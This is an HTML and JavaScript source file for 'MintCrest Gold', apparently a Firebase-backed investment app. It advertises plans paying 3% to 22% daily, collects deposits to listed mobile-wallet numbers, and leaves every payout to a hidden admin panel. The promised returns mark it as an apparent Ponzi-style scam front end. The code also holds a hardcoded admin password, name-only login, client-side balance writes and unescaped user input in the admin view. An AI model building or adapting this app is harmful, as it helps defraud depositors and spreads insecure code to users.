<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Ultimate Final</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .animate-marquee { display: inline-block; animation: marquee 20s linear infinite; white-space: nowrap; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="bg-blue-600/20 border-b border-blue-500/30 py-2 overflow-hidden z-[500]">
        <div class="animate-marquee text-[10px] font-black uppercase tracking-widest text-blue-400" id="broadcast-msg">
            Loading official announcements...
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic">Digital Asset Vault</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="User Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 text-white uppercase">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Live Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-4 grid grid-cols-2 gap-2">
                    <div class="bg-white/5 p-3 rounded-2xl text-center">
                        <p class="text-[7px] text-gray-500 uppercase font-bold">Total Profit</p>
                        <p class="text-xs font-black text-green-400" id="v-profit">₨ 0</p>
                    </div>
                    <div class="bg-white/5 p-3 rounded-2xl text-center">
                        <p class="text-[7px] text-gray-500 uppercase font-bold">Plan Validity</p>
                        <p class="text-xs font-black text-yellow-500" id="v-days">0 Days</p>
                    </div>
                </div>
                <div id="countdown-display" class="mt-6 text-[10px] font-black text-blue-500 uppercase italic tracking-widest text-center">SYNCHRONIZING...</div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📤 <span class="text-[9px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Investment Fleet</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Ledger Details</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-red-500">
                <h3 class="text-red-500 font-black text-[12px] uppercase mb-4 italic">🆘 Official Help Desk</h3>
                <textarea id="help-msg" placeholder="Tell admin your issue..." class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] font-bold outline-none border border-white/5 h-20"></textarea>
                <button onclick="sendHelp()" class="w-full bg-red-600 py-3 rounded-2xl font-black text-[9px] uppercase">Send Support Ticket</button>
            </div>

            <div class="glass p-8 rounded-[3rem] border-t-4 border-blue-500 shadow-xl">
                <h3 class="text-blue-500 font-black text-[12px] uppercase mb-4 italic tracking-widest">🎁 Redeem VIP Promo</h3>
                <input type="text" id="special-promo" placeholder="ENTER CODE" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-black uppercase text-blue-400 border border-blue-500/20 outline-none">
                <button onclick="claimPromo()" class="w-full bg-blue-600 py-3 rounded-2xl font-black text-[9px] uppercase">Claim Bonus</button>
            </div>

            <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[12px] uppercase mb-4 italic">Daily Lucky Spin</h3>
                <div id="spin-visual" class="w-16 h-16 border-2 border-dashed border-yellow-500/30 rounded-full mx-auto mb-4 flex items-center justify-center text-xl bg-white/5">🎡</div>
                <button id="spin-btn" onclick="startSpin()" class="bg-yellow-600 px-8 py-3 rounded-2xl font-black text-[9px] uppercase disabled:opacity-30">Spin Now</button>
                <p id="spin-timer" class="mt-2 text-[7px] font-bold text-gray-500 uppercase"></p>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase">Exit Vault</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-blue-600">
                <h3 class="text-center font-black text-blue-500 mb-6 uppercase text-sm">Deposit Capital</h3>
                <div class="text-[9px] font-black mb-6 space-y-2 uppercase">
                    <p class="flex justify-between"><span>Easypaisa:</span> <span>03379827882</span></p>
                    <p class="flex justify-between"><span>JazzCash:</span> <span>03705519562</span></p>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold border border-white/5 outline-none">
                <input type="text" id="dep-trx" placeholder="TID (Transaction ID)" class="w-full bg-white/5 p-4 rounded-xl mb-6 text-center font-bold border border-white/5 outline-none uppercase">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase">Submit Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-red-600">
                <h3 class="text-center font-black text-red-500 mb-6 uppercase text-sm">Withdraw Capital</h3>
                <input type="number" id="wd-amt" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold border border-white/5 outline-none">
                <input type="text" id="wd-acc" placeholder="Account Title & Number" class="w-full bg-white/5 p-4 rounded-xl mb-6 text-center text-[10px] font-bold border border-white/5 outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-5 rounded-2xl font-black text-[10px] uppercase">Submit Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <h2 class="text-xl font-black text-blue-500 uppercase mb-8 italic underline">Master Control Panel</h2>
        
        <div class="glass p-4 rounded-2xl mb-6">
            <h3 class="text-[9px] font-black uppercase mb-2 text-blue-400">Live Broadcast Message</h3>
            <input type="text" id="new-broadcast" placeholder="Write new update here..." class="w-full bg-white/5 p-3 rounded-lg text-[10px] mb-2 border border-white/10 text-white">
            <button onclick="updateBroadcast()" class="w-full bg-blue-600 py-2 rounded-lg font-black text-[8px] uppercase">Update All Users</button>
        </div>

        <div id="adm-sec-requests" class="space-y-2"></div>
        <button onclick="closeAdmin()" class="w-full mt-10 bg-red-600 py-4 rounded-2xl text-[10px] font-black uppercase">Close Panel</button>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="text-2xl">📜</button>
        <button onclick="changePage('more')" id="n-more" class="text-2xl">🏢</button>
    </nav>

    <script>
        // Firebase Configuration
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3 }, { n: "Bronze-S", p: 1000, r: 3.5 },
            { n: "Silver-X", p: 5000, r: 4.5 }, { n: "Gold-Master", p: 15000, r: 6 },
            { n: "Diamond-X", p: 50000, r: 8 }, { n: "Royal-Grand", p: 100000, r: 10 },
            { n: "⚡ FLASH 24H", p: 500, r: 12 }, { n: "👑 CROWN KING", p: 25000, r: 22 }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); if(saved) { document.getElementById('user-name').value = saved; login(); } 
            setInterval(updateCountdown, 1000);
            syncBroadcast();
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            // Important Fix: Do not reset balance if user already exists
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, lastSpin: 0, activeTier: 0, tierROI: 0, tierExpiry: 0, lastReqTime: Date.now() });
            startSync(name);
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); updateUI(); checkProfitAuto(); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center mb-2 text-[8px] font-black uppercase"><div>${d.type}<br><span class="opacity-40 text-[6px]">${d.promo || d.msg || ''}</span></div><div>₨ ${d.amount} (${d.status})</div></div>`; });
            });
        }

        function syncBroadcast() {
            db.collection("settings").doc("broadcast").onSnapshot(doc => {
                if(doc.exists) document.getElementById('broadcast-msg').innerText = doc.data().text;
            });
        }

        async function updateBroadcast() {
            const txt = document.getElementById('new-broadcast').value; if(!txt) return;
            await db.collection("settings").doc("broadcast").set({ text: txt }); alert("Broadcast Updated!");
        }

        function updateUI() {
            document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
            document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString();
            const daysLeft = user.tierExpiry ? Math.max(0, Math.ceil((user.tierExpiry - Date.now()) / 86400000)) : 0;
            document.getElementById('v-days').innerText = daysLeft + " Days";
            const diff = Date.now() - (user.lastSpin || 0);
            const btn = document.getElementById('spin-btn');
            if(diff < 86400000) { btn.disabled = true; document.getElementById('spin-timer').innerText = "LOCKED"; }
            else { btn.disabled = false; document.getElementById('spin-timer').innerText = "READY"; }
        }

        async function checkProfitAuto() {
            if (user.activeTier > 0 && (Date.now() - user.lastReqTime) >= 86400000 && Date.now() < user.tierExpiry) {
                const amt = (user.activeTier * user.tierROI) / 100;
                await db.collection("requests").add({ user: user.name, amount: amt, type: "Daily Profit", status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastReqTime: Date.now() });
            }
        }

        async function sendHelp() {
            const m = document.getElementById('help-msg').value; if(!m) return;
            await db.collection("requests").add({ user: user.name, amount: 0, type: "Support Msg", msg: m, status: "pending", time: Date.now() });
            alert("Message sent to Admin!"); document.getElementById('help-msg').value = "";
        }

        async function claimPromo() {
            const c = document.getElementById('special-promo').value.toUpperCase(); if(!c) return;
            await db.collection("requests").add({ user: user.name, amount: 0, type: "Promo Claim", promo: c, status: "pending", time: Date.now() });
            alert("Promo Claimed! Admin will review it."); document.getElementById('special-promo').value = "";
        }

        async function startSpin() {
            await db.collection("requests").add({ user: user.name, amount: 0, type: "Spin Bonus", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
            alert("Spin Recorded! Wait for Admin Bonus.");
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 mb-2"><div><h4 class="font-black text-[10px] uppercase text-gray-400">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Daily</p></div><p class="font-black text-[12px]">₨ ${p.p.toLocaleString()}</p></div>`;
            });
        }

        async function buy(p, roi, t) {
            if(user.balance < p) return alert("Low Balance!");
            if(confirm("Activate "+t+"?")) {
                const exp = Date.now() + (30 * 86400000);
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierExpiry: exp, lastReqTime: Date.now() });
                alert("Plan Active!");
            }
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value, t = document.getElementById('dep-trx').value; if(!a || !t) return;
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, type: "Deposit", status: "pending", time: Date.now() });
            alert("Deposit Submitted!"); changePage('activity');
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value, acc = document.getElementById('wd-acc').value;
            if(!a || !acc || a > user.balance) return alert("Invalid Balance!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "Withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) });
            alert("Withdraw Sent!");
        }

        function updateCountdown() {
            if(user && user.activeTier > 0) {
                const d = (user.lastReqTime + 86400000) - Date.now();
                if(d > 0) {
                    const h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
                    document.getElementById('countdown-display').innerText = `NEXT PROFIT IN: ${h}H ${m}M ${s}S`;
                } else document.getElementById('countdown-display').innerText = "PROCESSING YIELD...";
            } else document.getElementById('countdown-display').innerText = "VAULT SECURED";
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Master Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }

        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    list.innerHTML += `<div class="glass p-4 flex justify-between items-center text-[7px] font-black mb-2 uppercase"><div>User: ${d.user}<br>Type: ${d.type}<br>Detail: ${d.amount || d.promo || d.msg}</div><button onclick="handle('${doc.id}','${d.user}',${d.amount})" class="bg-blue-600 px-3 py-2 rounded">APPROVE</button></div>`;
                });
            });
        }
        async function handle(id, u, amt) {
            let val = amt; if(amt === 0) val = parseInt(prompt("Enter Amount to Add for this request:", "100"));
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            await ref.update({ balance: (doc.data().balance||0)+val });
            await db.collection("requests").doc(id).update({ status: 'approved', amount: val });
            alert("Request Approved!");
        }
    </script>
</body>
</html>
